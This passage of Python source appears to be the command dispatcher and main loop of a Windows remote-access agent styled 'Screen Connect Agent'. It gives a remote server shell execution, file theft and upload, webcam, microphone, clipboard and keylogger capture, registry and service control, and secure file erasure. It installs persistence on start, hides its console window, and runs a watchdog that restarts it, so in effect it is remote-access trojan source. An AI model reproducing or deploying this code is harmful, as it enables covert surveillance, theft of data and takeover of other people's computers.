                        fps=    data.get("fps",      CONFIG["STREAM_FPS"]),
                        quality=data.get("quality",  CONFIG["STREAM_QUALITY"]),
                        scale=  data.get("scale",    CONFIG["STREAM_SCALE"]),
                        mode=   data.get("mode",     CONFIG["STREAM_MODE"]),
                    )
                elif action == "stop":
                    streamer.stop()
                elif action == "set_mode":
                    streamer.set_mode(data.get("mode", "video"))
                    sio.emit("action_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "action": "set_mode", "mode": streamer.mode, "success": True,
                    })
                elif action == "set_quality":
                    q = max(10, min(95, int(data.get("quality", 55))))
                    streamer._quality_current = q
                elif action == "set_fps":
                    streamer.fps = max(1, min(30, int(data.get("fps", 20))))
                elif action == "set_scale":
                    streamer.scale = max(0.2, min(1.0, float(data.get("scale", 0.75))))

            # ── Screenshot ─────────────────────────────────────────────────
            elif tab == "screenshot":
                q   = data.get("quality", CONFIG["STREAM_QUALITY"])
                s   = data.get("scale",   CONFIG["STREAM_SCALE"])
                old_q, old_s = streamer.quality, streamer.scale
                streamer.quality, streamer.scale = q, s
                img = streamer.capture_single()
                streamer.quality, streamer.scale = old_q, old_s
                if img:
                    sio.emit("screenshot_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "frame": img, "image": img,
                        "ts": datetime.utcnow().isoformat(),
                    })

            # ── Mouse — FIXED: coord normalization ─────────────────────────
            elif tab == "mouse_event":
                if PYAUTOGUI_OK:
                    # Support both absolute (x,y) and normalized (x_norm, y_norm)
                    mon_w, mon_h = _get_monitor_resolution(streamer.monitor_idx)
                    x_norm = data.get("x_norm")
                    y_norm = data.get("y_norm")
                    if x_norm is not None and y_norm is not None:
                        # Normalized 0..1 → absolute pixels
                        x = int(float(x_norm) * mon_w)
                        y = int(float(y_norm) * mon_h)
                    else:
                        x = int(data.get("x", 0))
                        y = int(data.get("y", 0))
                    typ = data.get("type", "move")
                    btn = {0: "left", 1: "middle", 2: "right"}.get(
                        int(data.get("button", 0)), "left"
                    )
                    try:
                        if   typ == "move":
                            pyautogui.moveTo(x, y, duration=0, _pause=False)
                        elif typ == "down":
                            pyautogui.mouseDown(x, y, button=btn, _pause=False)
                        elif typ == "up":
                            pyautogui.mouseUp(x, y, button=btn, _pause=False)
                        elif typ == "click":
                            pyautogui.click(x, y, button=btn, _pause=False)
                        elif typ in ("rclick", "rightclick"):
                            pyautogui.click(x, y, button="right", _pause=False)
                        elif typ == "dblclick":
                            pyautogui.doubleClick(x, y, _pause=False)
                        elif typ == "drag":
                            tx = int(data.get("tx", x))
                            ty = int(data.get("ty", y))
                            pyautogui.dragTo(tx, ty, duration=0.08, button=btn, _pause=False)
                    except Exception as e:
                        log.warning(f"mouse_event error: {e}")

            # ── Scroll ─────────────────────────────────────────────────────
            elif tab == "scroll_event":
                if PYAUTOGUI_OK:
                    try:
                        mon_w, mon_h = _get_monitor_resolution(streamer.monitor_idx)
                        x_norm = data.get("x_norm")
                        y_norm = data.get("y_norm")
                        if x_norm is not None:
                            x = int(float(x_norm) * mon_w)
                            y = int(float(y_norm) * mon_h)
                        else:
                            x, y = int(data.get("x", 0)), int(data.get("y", 0))
                        dy     = data.get("dy", 0)
                        clicks = int(-dy / 120) if dy else 0
                        if clicks:
                            pyautogui.scroll(clicks, x=x, y=y, _pause=False)
                    except Exception as e:
                        log.warning(f"scroll_event error: {e}")

            # ── Keyboard ───────────────────────────────────────────────────
            elif tab == "key_event":
                if PYAUTOGUI_OK:
                    ktype = data.get("type", "down")
                    key   = data.get("key", "")
                    combo = data.get("combo", "")
                    KEY_MAP = {
                        "Enter": "enter", "Return": "enter",
                        "Backspace": "backspace", "Tab": "tab",
                        "Escape": "esc", "Delete": "delete",
                        "Insert": "insert", "Home": "home", "End": "end",
                        "PageUp": "pageup", "PageDown": "pagedown",
                        "ArrowUp": "up", "ArrowDown": "down",
                        "ArrowLeft": "left", "ArrowRight": "right",
                        " ": "space", "Control": "ctrl",
                        "Alt": "alt", "Shift": "shift", "Meta": "win",
                        "CapsLock": "capslock", "NumLock": "numlock",
                        "PrintScreen": "printscreen", "ScrollLock": "scrolllock",
                        "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4",
                        "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8",
                        "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12",
                    }
                    try:
                        if combo == "ctrl+alt+del":
                            subprocess.Popen(
                                ["powershell", "-Command",
                                 "(New-Object -ComObject Shell.Application).WindowsSecurity()"],
                                creationflags=subprocess.CREATE_NO_WINDOW
                            )
                        elif ktype in ("down", "press"):
                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                            if pg:
                                hotkey = []
                                if data.get("ctrl")  and key != "Control": hotkey.append("ctrl")
                                if data.get("alt")   and key != "Alt":     hotkey.append("alt")
                                if data.get("shift") and key != "Shift":   hotkey.append("shift")
                                if data.get("meta")  and key != "Meta":    hotkey.append("win")
                                hotkey.append(pg)
                                if len(hotkey) > 1:
                                    pyautogui.hotkey(*hotkey, _pause=False)
                                else:
                                    pyautogui.keyDown(pg, _pause=False)
                        elif ktype == "up":
                            pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                            if pg:
                                pyautogui.keyUp(pg, _pause=False)
                        elif ktype == "type":
                            # Type a full string
                            pyautogui.write(data.get("text", ""), interval=0.01)
                    except Exception as e:
                        log.warning(f"key_event error: {e}")

            # ── Ping ───────────────────────────────────────────────────────
            elif tab == "ping":
                sio.emit("ping_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "t": data.get("t"),
                    "ts": datetime.utcnow().isoformat(),
                })

            # ── System ─────────────────────────────────────────────────────
            elif tab == "system":
                action = data.get("action", "start")
                if action == "start":
                    sys_monitor.start(interval=data.get("interval", 2))
                else:
                    sys_monitor.stop()

            elif tab == "system_snapshot":
                sio.emit("system_stats_report", sys_monitor.get_snapshot())

            elif tab == "disks":
                sio.emit("disks_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "disks": sys_monitor.get_disk_list(),
                })

            elif tab == "network":
                sio.emit("network_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "interfaces": sys_monitor.get_network_interfaces(),
                })

            # ── Processes ──────────────────────────────────────────────────
            elif tab == "processes":
                procs = proc_mgr.list_processes()
                sio.emit("processes_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "processes": procs,
                    "count": len(procs),
                })

            elif tab == "kill_process":
                sio.emit("kill_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **proc_mgr.kill_process(int(data.get("pid", 0))),
                })

            elif tab == "start_process":
                sio.emit("start_process_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **proc_mgr.start_process(data.get("command", "")),
                })

            elif tab == "suspend_process":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "suspend_process",
                    **proc_mgr.suspend_process(int(data.get("pid", 0))),
                })

            elif tab == "resume_process":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "resume_process",
                    **proc_mgr.resume_process(int(data.get("pid", 0))),
                })

            # ── Shell ──────────────────────────────────────────────────────
            elif tab == "shell":
                result = shell.execute(
                    data.get("command", "echo hello"),
                    shell_type=data.get("shell_type", "cmd"),
                )
                sio.emit("shell_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})

            elif tab == "shell_env":
                sio.emit("shell_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **shell.get_env(),
                })

            # ── Files ──────────────────────────────────────────────────────
            elif tab == "file_list":
                sio.emit("file_list_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.list_directory(data.get("path", "C:\\")),
                })

            elif tab == "file_read":
                sio.emit("file_read_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.read_file(data.get("path", "")),
                })

            elif tab == "file_write":
                sio.emit("file_read_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.write_file(data.get("path", ""), data.get("content", "")),
                })

            elif tab == "file_download":
                sio.emit("file_download_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.download_file(data.get("path", "")),
                })

            elif tab == "file_upload":
                sio.emit("file_download_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.upload_file(data.get("path", ""), data.get("data", "")),
                })

            elif tab == "file_delete":
                sio.emit("file_delete_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.delete_file(data.get("path", "")),
                })

            elif tab == "file_copy":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_copy",
                    **files.copy_file(data.get("src", ""), data.get("dst", "")),
                })

            elif tab == "file_move":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_move",
                    **files.move_file(data.get("src", ""), data.get("dst", "")),
                })

            elif tab == "file_mkdir":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_mkdir",
                    **files.create_folder(data.get("path", "")),
                })

            elif tab == "file_rename":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "file_rename",
                    **files.rename(data.get("old", ""), data.get("new", "")),
                })

            elif tab == "file_search":
                sio.emit("file_list_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **files.search(data.get("root", "C:\\"), data.get("pattern", "*")),
                })

            elif tab == "drives":
                sio.emit("drives_report", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "drives": files.list_drives(),
                })

            # ── Webcam ─────────────────────────────────────────────────────
            elif tab == "webcam":
                sio.emit("webcam_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    **webcam.capture(data.get("camera", 0), data.get("quality", 80)),
                })

            elif tab == "webcam_list":
                sio.emit("webcam_list_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "cameras": webcam.list_cameras(),
                })

            # ── Clipboard ──────────────────────────────────────────────────
            elif tab == "clipboard_get":
                if CLIPBOARD_OK:
                    sio.emit("clipboard_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "content": pyperclip.paste()[:8192],
                        "ts": datetime.utcnow().isoformat(),
                    })

            elif tab == "clipboard_set":
                if CLIPBOARD_OK:
                    pyperclip.copy(data.get("text", ""))
                    sio.emit("clipboard_set_result", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "success": True,
                    })

            # ── Registry ───────────────────────────────────────────────────
            elif tab == "registry_read":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_read",
                    **registry.read_key(data.get("path", ""), data.get("value", "")),
                })

            elif tab == "registry_list":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_list",
                    **registry.list_key(data.get("path", "")),
                })

            elif tab == "registry_write":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_write",
                    **registry.write_key(data.get("path", ""), data.get("name", ""),
                                         data.get("data", ""), int(data.get("type", winreg.REG_SZ))),
                })

            elif tab == "registry_delete":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "registry_delete",
                    **registry.delete_value(data.get("path", ""), data.get("name", "")),
                })

            # ── Services ───────────────────────────────────────────────────
            elif tab == "services_list":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "services_list",
                    "services": services.list_services(),
                })

            elif tab == "service_control":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "service_control",
                    **services.control_service(data.get("name", ""), data.get("cmd", "stop")),
                })

            # ── Windows ────────────────────────────────────────────────────
            elif tab == "windows_list":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "windows_list",
                    "windows": winmgr.list_windows(),
                })

            elif tab == "window_focus":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_focus",
                    **winmgr.focus_window(int(data.get("hwnd", 0))),
                })

            elif tab == "window_close":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_close",
                    **winmgr.close_window(int(data.get("hwnd", 0))),
                })

            elif tab == "window_minimize":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_minimize",
                    **winmgr.minimize_window(int(data.get("hwnd", 0))),
                })

            elif tab == "window_maximize":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "window_maximize",
                    **winmgr.maximize_window(int(data.get("hwnd", 0))),
                })

            # ── Installed Apps ─────────────────────────────────────────────
            elif tab == "installed_apps":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "installed_apps",
                    "apps": apps.list_apps(),
                })

            # ── Audio capture ──────────────────────────────────────────────
            elif tab == "audio_capture":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "audio_capture",
                    **audio.capture_chunk(
                        seconds=float(data.get("seconds", 3.0)),
                        sample_rate=int(data.get("sample_rate", 16000)),
                    ),
                })

            elif tab == "audio_devices":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "audio_devices",
                    "devices": audio.list_devices(),
                })

            # ── Secure erase ───────────────────────────────────────────────
            elif tab == "secure_erase":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "secure_erase",
                    **eraser.wipe_file(data.get("path", ""), int(data.get("passes", 3))),
                })

            # ── Power ──────────────────────────────────────────────────────
            elif tab == "lock_screen":
                ctypes.windll.user32.LockWorkStation()
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "lock_screen", "success": True,
                })

            elif tab == "sleep":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "sleep", "success": True,
                })
                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

            elif tab == "shutdown":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "shutdown", "success": True,
                })
                time.sleep(1)
                os.system('shutdown /s /t 10 /c "Screen Connect remote shutdown"')

            elif tab == "restart":
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "restart", "success": True,
                })
                time.sleep(1)
                os.system('shutdown /r /t 10 /c "Screen Connect remote restart"')

            elif tab == "abort_shutdown":
                os.system("shutdown /a")
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "abort_shutdown", "success": True,
                })

            elif tab == "logoff":
                os.system("shutdown /l")
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "logoff", "success": True,
                })

            elif tab == "hibernate":
                os.system("shutdown /h")
                sio.emit("action_result", {
                    "device_id": CONFIG["DEVICE_TOKEN"],
                    "action": "hibernate", "success": True,
                })

            elif tab == "uninstall":
                remove_persistence()
                sio.disconnect()
                sys.exit(0)

            else:
                log.warning(f"Unknown tab: {tab}")

    # ── Main Run Loop ─────────────────────────────────────────────────────
    def run(self):
        log.info(f"Screen Connect Agent v{CONFIG['AGENT_VERSION']} starting...")
        install_persistence()
        _net_monitor.start()
        time.sleep(CONFIG["STARTUP_DELAY"])

        while not self._stop_flag.is_set():
            sio = streamer = sys_monitor = heartbeat = cursor = keylogger = clipboard = alerts = None
            try:
                sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard, alerts = self._make_client()
                log.info(f"Connecting to {CONFIG['SERVER_URL']}...")
                sio.connect(
                    CONFIG["SERVER_URL"],
                    transports=["websocket", "polling"],
                    wait_timeout=20,
                    socketio_path="/socket.io",
                )
                sio.wait()
            except socketio.exceptions.ConnectionError as e:
                log.warning(f"Connection error: {e}")
            except Exception as e:
                log.error(f"Agent error: {e}")
            finally:
                for comp in [streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard, alerts]:
                    try:
                        if comp and hasattr(comp, "stop"):
                            comp.stop()
                    except Exception:
                        pass

            if self._stop_flag.is_set():
                break

            jitter = random.uniform(0, self._reconnect_delay * 0.3)
            delay  = self._reconnect_delay + jitter
            log.info(f"Reconnecting in {delay:.1f}s...")
            time.sleep(delay)
            self._reconnect_delay = min(self._reconnect_delay * 2, CONFIG["RECONNECT_MAX"])

    def stop(self):
        self._stop_flag.set()


# ════════════════════════════════════════════════════════════════════════════
#  WATCHDOG — restarts agent thread if it dies
# ════════════════════════════════════════════════════════════════════════════
def _watchdog(agent_thread_ref: list):
    time.sleep(60)
    while True:
        time.sleep(30)
        t = agent_thread_ref[0]
        if t and not t.is_alive():
            log.warning("Watchdog: agent thread died — restarting...")
            try:
                new_agent  = ScreenConnectAgent()
                new_thread = threading.Thread(target=new_agent.run, daemon=False, name="sc-main")
                new_thread.start()
                agent_thread_ref[0] = new_thread
            except Exception as e:
                log.error(f"Watchdog restart failed: {e}")


# ════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    # Hide console window on Windows
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

    agent        = ScreenConnectAgent()
    agent_thread = threading.Thread(target=agent.run, daemon=False, name="sc-main")
    agent_ref    = [agent_thread]
    agent_thread.start()

    watchdog_thread = threading.Thread(
        target=_watchdog, args=(agent_ref,), daemon=True, name="sc-watchdog"
    )
    watchdog_thread.start()

    agent_thread.join()
